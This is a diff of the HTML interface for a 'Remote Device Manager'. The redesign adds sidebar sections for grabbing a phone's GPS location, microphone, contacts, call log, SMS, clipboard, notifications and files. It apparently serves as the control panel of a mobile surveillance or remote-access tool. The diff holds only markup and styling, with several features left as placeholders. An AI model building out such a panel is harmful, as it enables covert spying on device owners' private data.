@@ -8,224 +8,387 @@
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <style>
+        .sidebar-item {
+            transition: all 0.2s ease;
+        }
+        .sidebar-item:hover {
+            background-color: #f3f4f6;
+            transform: translateX(4px);
+        }
+        .sidebar-item.active {
+            background-color: #3b82f6;
+            color: white;
+        }
+        .sidebar-item.active:hover {
+            background-color: #2563eb;
+        }
+        .content-section {
+            display: none;
+        }
+        .content-section.active {
+            display: block;
+        }
+        .file-item {
+            transition: all 0.2s ease;
+        }
+        .file-item:hover {
+            background-color: #f9fafb;
+            transform: translateX(2px);
+        }
+    </style>
 </head>
-<body class="bg-gradient-to-br from-blue-50 to-indigo-100 min-h-screen">
-    <div class="min-h-screen">
-        <!-- Header -->
-        <header class="bg-white shadow-lg border-b border-gray-200">
-            <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
-                <div class="flex justify-between items-center py-6">
+<body class="bg-gray-50 min-h-screen">
+    <div class="flex min-h-screen">
+        <!-- Sidebar -->
+        <div class="w-64 bg-white shadow-lg border-r border-gray-200">
+            <!-- Header -->
+            <div class="p-6 border-b border-gray-200">
+                <div class="flex items-center space-x-3">
+                    <div class="bg-blue-600 p-2 rounded-lg">
+                        <i class="fas fa-mobile-alt text-white text-lg"></i>
+                    </div>
+                    <div>
+                        <h1 class="text-lg font-bold text-gray-900">Device Manager</h1>
+                        <p class="text-sm text-gray-500">Remote Control</p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Device Selection -->
+            <div class="p-4 border-b border-gray-200">
+                <label class="block text-sm font-medium text-gray-700 mb-2">Select Device</label>
+                <select id="device-selector" class="w-full px-3 py-2 border border-gray-300 rounded-md text-sm focus:outline-none focus:ring-2 focus:ring-blue-500">
+                    <option value="">No devices connected</option>
+                </select>
+            </div>
+
+            <!-- Navigation Menu -->
+            <nav class="p-4">
+                <ul class="space-y-1">
+                    <li>
+                        <button class="sidebar-item active w-full flex items-center px-3 py-2 text-sm font-medium rounded-md" data-section="info">
+                            <i class="fas fa-info-circle w-5 h-5 mr-3 text-gray-400"></i>
+                            Info
+                        </button>
+                    </li>
+                    <li>
+                        <button class="sidebar-item w-full flex items-center px-3 py-2 text-sm font-medium rounded-md" data-section="gps">
+                            <i class="fas fa-map-marker-alt w-5 h-5 mr-3 text-gray-400"></i>
+                            GPS
+                        </button>
+                    </li>
+                    <li>
+                        <button class="sidebar-item w-full flex items-center px-3 py-2 text-sm font-medium rounded-md" data-section="microphone">
+                            <i class="fas fa-microphone w-5 h-5 mr-3 text-gray-400"></i>
+                            Microphone
+                        </button>
+                    </li>
+                    <li>
+                        <button class="sidebar-item w-full flex items-center px-3 py-2 text-sm font-medium rounded-md" data-section="contacts">
+                            <i class="fas fa-address-book w-5 h-5 mr-3 text-gray-400"></i>
+                            Contacts
+                        </button>
+                    </li>
+                    <li>
+                        <button class="sidebar-item w-full flex items-center px-3 py-2 text-sm font-medium rounded-md" data-section="call-log">
+                            <i class="fas fa-phone w-5 h-5 mr-3 text-gray-400"></i>
+                            Call Log
+                        </button>
+                    </li>
+                    <li>
+                        <button class="sidebar-item w-full flex items-center px-3 py-2 text-sm font-medium rounded-md" data-section="clipboard">
+                            <i class="fas fa-clipboard w-5 h-5 mr-3 text-gray-400"></i>
+                            Clipboard Log
+                        </button>
+                    </li>
+                    <li>
+                        <button class="sidebar-item w-full flex items-center px-3 py-2 text-sm font-medium rounded-md" data-section="notifications">
+                            <i class="fas fa-bell w-5 h-5 mr-3 text-gray-400"></i>
+                            Notification Log
+                        </button>
+                    </li>
+                    <li>
+                        <button class="sidebar-item w-full flex items-center px-3 py-2 text-sm font-medium rounded-md" data-section="sms">
+                            <i class="fas fa-sms w-5 h-5 mr-3 text-gray-400"></i>
+                            SMS Manager
+                        </button>
+                    </li>
+                    <li>
+                        <button class="sidebar-item w-full flex items-center px-3 py-2 text-sm font-medium rounded-md" data-section="wifi">
+                            <i class="fas fa-wifi w-5 h-5 mr-3 text-gray-400"></i>
+                            WiFi Manager
+                        </button>
+                    </li>
+                    <li>
+                        <button class="sidebar-item w-full flex items-center px-3 py-2 text-sm font-medium rounded-md" data-section="apps">
+                            <i class="fas fa-mobile-alt w-5 h-5 mr-3 text-gray-400"></i>
+                            Installed Apps
+                        </button>
+                    </li>
+                    <li>
+                        <button class="sidebar-item w-full flex items-center px-3 py-2 text-sm font-medium rounded-md" data-section="permissions">
+                            <i class="fas fa-shield-alt w-5 h-5 mr-3 text-gray-400"></i>
+                            Allowed Permissions
+                        </button>
+                    </li>
+                    <li>
+                        <button class="sidebar-item w-full flex items-center px-3 py-2 text-sm font-medium rounded-md" data-section="file-explorer">
+                            <i class="fas fa-folder w-5 h-5 mr-3 text-gray-400"></i>
+                            File Explorer
+                        </button>
+                    </li>
+                    <li>
+                        <button class="sidebar-item w-full flex items-center px-3 py-2 text-sm font-medium rounded-md" data-section="downloads">
+                            <i class="fas fa-download w-5 h-5 mr-3 text-gray-400"></i>
+                            Downloads
+                        </button>
+                    </li>
+                </ul>
+            </nav>
+        </div>
+
+        <!-- Main Content -->
+        <div class="flex-1 flex flex-col">
+            <!-- Top Bar -->
+            <div class="bg-white shadow-sm border-b border-gray-200 px-6 py-4">
+                <div class="flex items-center justify-between">
                     <div class="flex items-center space-x-4">
-                        <div class="bg-gradient-to-r from-blue-600 to-indigo-600 p-3 rounded-xl">
-                            <i class="fas fa-mobile-alt text-white text-xl"></i>
-                        </div>
-                        <div>
-                            <h1 class="text-3xl font-bold text-gray-900">Remote Device Manager</h1>
-                            <p class="text-gray-600">Manage your devices from anywhere</p>
-                        </div>
-                        <span class="ml-4 px-3 py-1 bg-green-100 text-green-800 text-sm rounded-full font-medium" id="status">
-                            <i class="fas fa-circle text-green-500 mr-1"></i>
-                            Online
+                        <h2 id="content-title" class="text-xl font-semibold text-gray-900">Device Information</h2>
+                        <span id="device-status" class="px-3 py-1 bg-gray-100 text-gray-600 text-sm rounded-full">
+                            <i class="fas fa-circle text-gray-400 mr-1"></i>
+                            No device selected
                         </span>
                     </div>
-                    <button id="refresh-btn" class="bg-gradient-to-r from-blue-600 to-indigo-600 text-white px-6 py-3 rounded-lg hover:from-blue-700 hover:to-indigo-700 transition-all duration-200 shadow-lg">
-                        <i class="fas fa-sync-alt mr-2"></i>
-                        Refresh
+                    <button class="bg-blue-600 text-white px-4 py-2 rounded-lg hover:bg-blue-700 transition-colors flex items-center">
+                        <i class="fas fa-home mr-2"></i>
+                        Home
                     </button>
                 </div>
             </div>
-        </header>
 
-        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
-            <!-- Devices Table -->
-            <div class="bg-white rounded-xl shadow-lg overflow-hidden">
-                <div class="px-6 py-4 bg-gradient-to-r from-gray-50 to-gray-100 border-b border-gray-200">
-                    <h2 class="text-xl font-semibold text-gray-900">
-                        <i class="fas fa-devices mr-2 text-blue-600"></i>
-                        Connected Devices
-                    </h2>
-                </div>
-                
-                <div class="overflow-x-auto">
-                    <table class="min-w-full divide-y divide-gray-200" id="devices-table">
-                        <thead class="bg-gray-50">
-                            <tr>
-                                <th class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Device</th>
-                                <th class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Platform</th>
-                                <th class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Status</th>
-                                <th class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">First Seen</th>
-                                <th class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Last Seen</th>
-                                <th class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Location</th>
-                                <th class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Contacts</th>
-                                <th class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Actions</th>
-                            </tr>
-                        </thead>
-                        <tbody class="bg-white divide-y divide-gray-200" id="devices-tbody">
-                            <!-- Devices will be populated here -->
-                        </tbody>
-                    </table>
-                </div>
-                
-                <div id="no-devices" class="hidden text-center py-12">
-                    <div class="text-gray-400 mb-4">
-                        <i class="fas fa-mobile-alt text-6xl"></i>
+            <!-- Content Area -->
+            <div class="flex-1 p-6 overflow-auto">
+                <!-- Info Section -->
+                <div id="info-section" class="content-section active">
+                    <div class="bg-white rounded-lg shadow-sm border border-gray-200 p-6">
+                        <h3 class="text-lg font-semibold text-gray-900 mb-4">Device Information</h3>
+                        <div id="device-info" class="space-y-4">
+                            <p class="text-gray-500">Select a device to view information</p>
+                        </div>
                     </div>
-                    <h3 class="text-lg font-medium text-gray-900 mb-2">No devices connected</h3>
-                    <p class="text-gray-500">Connect your mobile devices to start managing them remotely.</p>
                 </div>
-            </div>
 
-            <!-- Device Control Modal -->
-            <div id="device-modal" class="fixed inset-0 bg-black bg-opacity-50 hidden z-50">
-                <div class="flex items-center justify-center min-h-screen p-4">
-                    <div class="bg-white rounded-xl shadow-2xl max-w-6xl w-full max-h-screen overflow-y-auto">
-                        <div class="px-6 py-4 border-b border-gray-200 bg-gradient-to-r from-blue-50 to-indigo-50">
-                            <div class="flex items-center justify-between">
-                                <h3 class="text-xl font-semibold text-gray-900" id="modal-title">
-                                    <i class="fas fa-mobile-alt mr-2 text-blue-600"></i>
-                                    Device Control Panel
-                                </h3>
-                                <button id="close-modal" class="text-gray-400 hover:text-gray-600 transition-colors">
-                                    <i class="fas fa-times text-xl"></i>
+                <!-- GPS Section -->
+                <div id="gps-section" class="content-section">
+                    <div class="bg-white rounded-lg shadow-sm border border-gray-200 p-6">
+                        <div class="flex items-center justify-between mb-4">
+                            <h3 class="text-lg font-semibold text-gray-900">GPS Location</h3>
+                            <button id="request-location" class="bg-blue-600 text-white px-4 py-2 rounded-lg hover:bg-blue-700 transition-colors">
+                                <i class="fas fa-crosshairs mr-2"></i>
+                                Get Location
+                            </button>
+                        </div>
+                        <div id="map" class="h-96 rounded-lg border border-gray-200 mb-4"></div>
+                        <div id="location-info" class="bg-gray-50 rounded-lg p-4">
+                            <p class="text-gray-500">No location data available</p>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Microphone Section -->
+                <div id="microphone-section" class="content-section">
+                    <div class="bg-white rounded-lg shadow-sm border border-gray-200 p-6">
+                        <h3 class="text-lg font-semibold text-gray-900 mb-4">Microphone Control</h3>
+                        <div class="space-y-4">
+                            <div class="flex items-center space-x-4">
+                                <button class="bg-red-600 text-white px-6 py-3 rounded-lg hover:bg-red-700 transition-colors">
+                                    <i class="fas fa-microphone mr-2"></i>
+                                    Start Recording
+                                </button>
+                                <button class="bg-gray-600 text-white px-6 py-3 rounded-lg hover:bg-gray-700 transition-colors">
+                                    <i class="fas fa-stop mr-2"></i>
+                                    Stop Recording
+                                </button>
+                            </div>
+                            <div class="bg-gray-50 rounded-lg p-4">
+                                <p class="text-gray-500">Microphone recording functionality requires native implementation</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Contacts Section -->
+                <div id="contacts-section" class="content-section">
+                    <div class="bg-white rounded-lg shadow-sm border border-gray-200 p-6">
+                        <div class="flex items-center justify-between mb-4">
+                            <h3 class="text-lg font-semibold text-gray-900">Contacts</h3>
+                            <div class="flex space-x-2">
+                                <button id="request-contacts" class="bg-blue-600 text-white px-4 py-2 rounded-lg hover:bg-blue-700 transition-colors">
+                                    <i class="fas fa-sync mr-2"></i>
+                                    Refresh
+                                </button>
+                                <button id="download-contacts" class="bg-green-600 text-white px-4 py-2 rounded-lg hover:bg-green-700 transition-colors">
+                                    <i class="fas fa-download mr-2"></i>
+                                    Download
                                 </button>
                             </div>
                         </div>
-                        
-                        <div class="p-6">
-                            <div class="grid grid-cols-1 lg:grid-cols-2 gap-6 mb-6">
-                                <!-- Location Section -->
-                                <div class="bg-gradient-to-br from-green-50 to-emerald-50 rounded-xl p-6 border border-green-200">
-                                    <h4 class="text-lg font-semibold text-gray-900 mb-4">
-                                        <i class="fas fa-map-marker-alt mr-2 text-green-600"></i>
-                                        Location Tracking
-                                    </h4>
-                                    <div id="map" class="h-64 rounded-lg border border-green-200 mb-4"></div>
-                                    <div id="location-info" class="mb-4">
-                                        <!-- Location details will be shown here -->
-                                    </div>
-                                    <button id="request-location" class="bg-gradient-to-r from-green-600 to-emerald-600 text-white px-4 py-2 rounded-lg hover:from-green-700 hover:to-emerald-700 transition-all duration-200 shadow-md">
-                                        <i class="fas fa-crosshairs mr-2"></i>
-                                        Request Current Location
-                                    </button>
-                                </div>
+                        <div id="contacts-list" class="max-h-96 overflow-y-auto border border-gray-200 rounded-lg">
+                            <div class="p-4 text-center text-gray-500">
+                                <i class="fas fa-address-book text-4xl mb-2 block text-gray-300"></i>
+                                No contacts loaded
+                            </div>
+                        </div>
+                        <div id="contacts-count" class="mt-4 text-sm text-gray-600"></div>
+                    </div>
+                </div>
 
-                                <!-- Contacts Section -->
-                                <div class="bg-gradient-to-br from-purple-50 to-indigo-50 rounded-xl p-6 border border-purple-200">
-                                    <h4 class="text-lg font-semibold text-gray-900 mb-4">
-                                        <i class="fas fa-address-book mr-2 text-purple-600"></i>
-                                        Contacts Management
-                                    </h4>
-                                    <div id="contacts-list" class="max-h-48 overflow-y-auto mb-4 bg-white rounded-lg p-3 border border-purple-200">
-                                        <!-- Contacts will be shown here -->
-                                    </div>
-                                    <span id="contacts-count" class="text-sm text-gray-600 mb-3 block"></span>
-                                    <div class="flex space-x-2">
-                                        <button id="request-contacts" class="bg-gradient-to-r from-purple-600 to-indigo-600 text-white px-4 py-2 rounded-lg hover:from-purple-700 hover:to-indigo-700 transition-all duration-200 shadow-md">
-                                            <i class="fas fa-sync mr-2"></i>
-                                            Refresh Contacts
-                                        </button>
-                                        <button id="download-contacts" class="bg-gradient-to-r from-blue-600 to-cyan-600 text-white px-4 py-2 rounded-lg hover:from-blue-700 hover:to-cyan-700 transition-all duration-200 shadow-md">
-                                            <i class="fas fa-download mr-2"></i>
-                                            Download
-                                        </button>
-                                    </div>
-                                </div>
+                <!-- Call Log Section -->
+                <div id="call-log-section" class="content-section">
+                    <div class="bg-white rounded-lg shadow-sm border border-gray-200 p-6">
+                        <div class="flex items-center justify-between mb-4">
+                            <h3 class="text-lg font-semibold text-gray-900">Call Log</h3>
+                            <div class="flex space-x-2">
+                                <button id="request-call-log" class="bg-blue-600 text-white px-4 py-2 rounded-lg hover:bg-blue-700 transition-colors">
+                                    <i class="fas fa-sync mr-2"></i>
+                                    Refresh
+                                </button>
+                                <button id="download-call-log" class="bg-green-600 text-white px-4 py-2 rounded-lg hover:bg-green-700 transition-colors">
+                                    <i class="fas fa-download mr-2"></i>
+                                    Download
+                                </button>
                             </div>
+                        </div>
+                        <div id="call-log-list" class="max-h-96 overflow-y-auto border border-gray-200 rounded-lg">
+                            <div class="p-4 text-center text-gray-500">
+                                <i class="fas fa-phone text-4xl mb-2 block text-gray-300"></i>
+                                No call history loaded
+                            </div>
+                        </div>
+                        <div id="call-log-count" class="mt-4 text-sm text-gray-600"></div>
+                    </div>
+                </div>
 
-                            <!-- SMS Section -->
-                            <div class="bg-gradient-to-br from-blue-50 to-cyan-50 rounded-xl p-6 border border-blue-200 mb-6">
-                                <h4 class="text-lg font-semibold text-gray-900 mb-4">
-                                    <i class="fas fa-sms mr-2 text-blue-600"></i>
-                                    SMS Management
-                                </h4>
-                                <div id="sms-list" class="max-h-64 overflow-y-auto mb-4 bg-white rounded-lg p-3 border border-blue-200">
-                                    <!-- SMS will be shown here -->
-                                </div>
-                                <span id="sms-count" class="text-sm text-gray-600 mb-3 block"></span>
-                                <div class="flex space-x-2">
-                                    <button id="request-sms" class="bg-gradient-to-r from-blue-600 to-cyan-600 text-white px-4 py-2 rounded-lg hover:from-blue-700 hover:to-cyan-700 transition-all duration-200 shadow-md">
-                                        <i class="fas fa-sync mr-2"></i>
-                                        Load Messages
-                                    </button>
-                                    <button id="download-sms" class="bg-gradient-to-r from-green-600 to-teal-600 text-white px-4 py-2 rounded-lg hover:from-green-700 hover:to-teal-700 transition-all duration-200 shadow-md">
-                                        <i class="fas fa-download mr-2"></i>
-                                        Download
-                                    </button>
-                                </div>
-                            </div>
-                            
-                            <!-- Call Log Section -->
-                            <div class="bg-gradient-to-br from-green-50 to-teal-50 rounded-xl p-6 border border-green-200 mb-6">
-                                <h4 class="text-lg font-semibold text-gray-900 mb-4">
-                                    <i class="fas fa-phone mr-2 text-green-600"></i>
-                                    Call History
-                                </h4>
-                                <div id="call-log-list" class="max-h-64 overflow-y-auto mb-4 bg-white rounded-lg p-3 border border-green-200">
-                                    <!-- Call log will be shown here -->
-                                </div>
-                                <span id="call-log-count" class="text-sm text-gray-600 mb-3 block"></span>
-                                <div class="flex space-x-2">
-                                    <button id="request-call-log" class="bg-gradient-to-r from-green-600 to-teal-600 text-white px-4 py-2 rounded-lg hover:from-green-700 hover:to-teal-700 transition-all duration-200 shadow-md">
-                                        <i class="fas fa-sync mr-2"></i>
-                                        Load Call Log
-                                    </button>
-                                    <button id="download-call-log" class="bg-gradient-to-r from-blue-600 to-cyan-600 text-white px-4 py-2 rounded-lg hover:from-blue-700 hover:to-cyan-700 transition-all duration-200 shadow-md">
-                                        <i class="fas fa-download mr-2"></i>
-                                        Download
-                                    </button>
-                                </div>
-                            </div>
-                            
-                            <!-- File Management Section -->
-                            <div class="bg-gradient-to-br from-orange-50 to-red-50 rounded-xl p-6 border border-orange-200">
-                                <h4 class="text-lg font-semibold text-gray-900 mb-4">
-                                    <i class="fas fa-folder-open mr-2 text-orange-600"></i>
-                                    File Management
-                                </h4>
-                                
-                                <!-- File Upload -->
-                                <div class="mb-6 bg-white rounded-lg p-4 border border-orange-200">
-                                    <label class="block text-sm font-medium text-gray-700 mb-2">
-                                        <i class="fas fa-upload mr-1"></i>
-                                        Upload File to Device
-                                    </label>
-                                    <div class="flex items-center space-x-2">
-                                        <input type="file" id="file-upload" class="block w-full text-sm text-gray-500 file:mr-4 file:py-2 file:px-4 file:rounded-lg file:border-0 file:text-sm file:font-semibold file:bg-orange-50 file:text-orange-700 hover:file:bg-orange-100 border border-gray-300 rounded-lg">
-                                        <button id="upload-btn" class="bg-gradient-to-r from-orange-600 to-red-600 text-white px-4 py-2 rounded-lg hover:from-orange-700 hover:to-red-700 transition-all duration-200 shadow-md whitespace-nowrap">
-                                            <i class="fas fa-upload mr-2"></i>
-                                            Upload
-                                        </button>
-                                    </div>
-                                </div>
+                <!-- Clipboard Section -->
+                <div id="clipboard-section" class="content-section">
+                    <div class="bg-white rounded-lg shadow-sm border border-gray-200 p-6">
+                        <h3 class="text-lg font-semibold text-gray-900 mb-4">Clipboard Log</h3>
+                        <div class="bg-gray-50 rounded-lg p-4">
+                            <p class="text-gray-500">Clipboard monitoring functionality would be implemented here</p>
+                        </div>
+                    </div>
+                </div>
 
-                                <!-- File Browser -->
-                                <div class="bg-white rounded-lg border border-orange-200">
-                                    <div class="px-4 py-3 border-b bg-gradient-to-r from-orange-50 to-red-50 rounded-t-lg">
-                                        <div class="flex items-center justify-between">
-                                            <div class="flex items-center space-x-2">
-                                                <button id="go-back" class="text-orange-600 hover:text-orange-700 transition-colors disabled:text-gray-400" disabled>
-                                                    <i class="fas fa-arrow-left"></i>
-                                                </button>
-                                                <span class="text-sm font-medium text-gray-900">
-                                                    <i class="fas fa-folder mr-2 text-orange-600"></i>
-                                                    <span id="current-path">/storage/emulated/0</span>
-                                                </span>
-                                            </div>
-                                            <button id="refresh-files" class="text-orange-600 hover:text-orange-700 transition-colors">
-                                                <i class="fas fa-sync text-sm"></i>
-                                            </button>
-                                        </div>
-                                    </div>
-                                    <div id="file-browser" class="max-h-80 overflow-y-auto">
-                                        <div class="p-4">
-                                            <p class="text-gray-500 text-sm text-center py-4">
-                                                <i class="fas fa-folder mr-2 text-orange-600"></i>
-                                                Click "Refresh Files" to browse device files
-                                            </p>
-                                        </div>
-                                    </div>
+                <!-- Notifications Section -->
+                <div id="notifications-section" class="content-section">
+                    <div class="bg-white rounded-lg shadow-sm border border-gray-200 p-6">
+                        <h3 class="text-lg font-semibold text-gray-900 mb-4">Notification Log</h3>
+                        <div class="bg-gray-50 rounded-lg p-4">
+                            <p class="text-gray-500">Notification monitoring functionality would be implemented here</p>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- SMS Section -->
+                <div id="sms-section" class="content-section">
+                    <div class="bg-white rounded-lg shadow-sm border border-gray-200 p-6">
+                        <div class="flex items-center justify-between mb-4">
+                            <h3 class="text-lg font-semibold text-gray-900">SMS Manager</h3>
+                            <div class="flex space-x-2">
+                                <button id="request-sms" class="bg-blue-600 text-white px-4 py-2 rounded-lg hover:bg-blue-700 transition-colors">
+                                    <i class="fas fa-sync mr-2"></i>
+                                    Load Messages
+                                </button>
+                                <button id="download-sms" class="bg-green-600 text-white px-4 py-2 rounded-lg hover:bg-green-700 transition-colors">
+                                    <i class="fas fa-download mr-2"></i>
+                                    Download
+                                </button>
+                            </div>
+                        </div>
+                        <div id="sms-list" class="max-h-96 overflow-y-auto border border-gray-200 rounded-lg">
+                            <div class="p-4 text-center text-gray-500">
+                                <i class="fas fa-sms text-4xl mb-2 block text-gray-300"></i>
+                                No messages loaded
+                            </div>
+                        </div>
+                        <div id="sms-count" class="mt-4 text-sm text-gray-600"></div>
+                    </div>
+                </div>
+
+                <!-- WiFi Section -->
+                <div id="wifi-section" class="content-section">
+                    <div class="bg-white rounded-lg shadow-sm border border-gray-200 p-6">
+                        <h3 class="text-lg font-semibold text-gray-900 mb-4">WiFi Manager</h3>
+                        <div class="bg-gray-50 rounded-lg p-4">
+                            <p class="text-gray-500">WiFi management functionality would be implemented here</p>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Apps Section -->
+                <div id="apps-section" class="content-section">
+                    <div class="bg-white rounded-lg shadow-sm border border-gray-200 p-6">
+                        <h3 class="text-lg font-semibold text-gray-900 mb-4">Installed Apps</h3>
+                        <div class="bg-gray-50 rounded-lg p-4">
+                            <p class="text-gray-500">Installed apps list would be implemented here</p>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Permissions Section -->
+                <div id="permissions-section" class="content-section">
+                    <div class="bg-white rounded-lg shadow-sm border border-gray-200 p-6">
+                        <h3 class="text-lg font-semibold text-gray-900 mb-4">Allowed Permissions</h3>
+                        <div class="bg-gray-50 rounded-lg p-4">
+                            <p class="text-gray-500">App permissions management would be implemented here</p>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- File Explorer Section -->
+                <div id="file-explorer-section" class="content-section">
+                    <div class="bg-white rounded-lg shadow-sm border border-gray-200">
+                        <!-- File Explorer Header -->
+                        <div class="px-6 py-4 border-b border-gray-200 bg-gray-50">
+                            <div class="flex items-center justify-between">
+                                <h3 class="text-lg font-semibold text-gray-900">Files</h3>
+                                <button id="refresh-files" class="bg-blue-600 text-white px-4 py-2 rounded-lg hover:bg-blue-700 transition-colors">
+                                    <i class="fas fa-sync mr-2"></i>
+                                    Refresh
+                                </button>
+                            </div>
+                        </div>
+
+                        <!-- File Navigation -->
+                        <div class="px-6 py-3 border-b border-gray-200 bg-white">
+                            <div class="flex items-center space-x-2">
+                                <button id="go-back" class="text-gray-400 hover:text-gray-600 transition-colors disabled:text-gray-300" disabled>
+                                    <i class="fas fa-arrow-left"></i>
+                                </button>
+                                <div class="flex items-center text-sm text-gray-600">
+                                    <i class="fas fa-folder mr-2"></i>
+                                    <span id="current-path">/</span>
                                 </div>
                             </div>
+                        </div>
+
+                        <!-- File List -->
+                        <div id="file-browser" class="max-h-96 overflow-y-auto">
+                            <div class="p-6 text-center text-gray-500">
+                                <i class="fas fa-folder-open text-4xl mb-2 block text-gray-300"></i>
+                                <p>Click "Refresh" to browse device files</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Downloads Section -->
+                <div id="downloads-section" class="content-section">
+                    <div class="bg-white rounded-lg shadow-sm border border-gray-200 p-6">
+                        <h3 class="text-lg font-semibold text-gray-900 mb-4">Downloads</h3>
+                        <div class="bg-gray-50 rounded-lg p-4">
+                            <p class="text-gray-500">Downloaded files would be listed here</p>
                         </div>
                     </div>
                 </div>
